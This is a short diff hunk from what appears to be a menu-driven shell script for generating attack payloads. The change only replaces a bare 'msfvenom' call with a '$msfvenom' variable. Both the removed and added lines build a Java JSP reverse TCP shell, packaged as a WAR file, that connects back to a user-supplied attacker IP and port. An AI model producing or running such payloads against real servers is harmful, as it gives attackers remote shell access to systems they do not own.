@@ -616,7 +616,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
+         			$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f war > output/$fira.war
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '9'
 				then
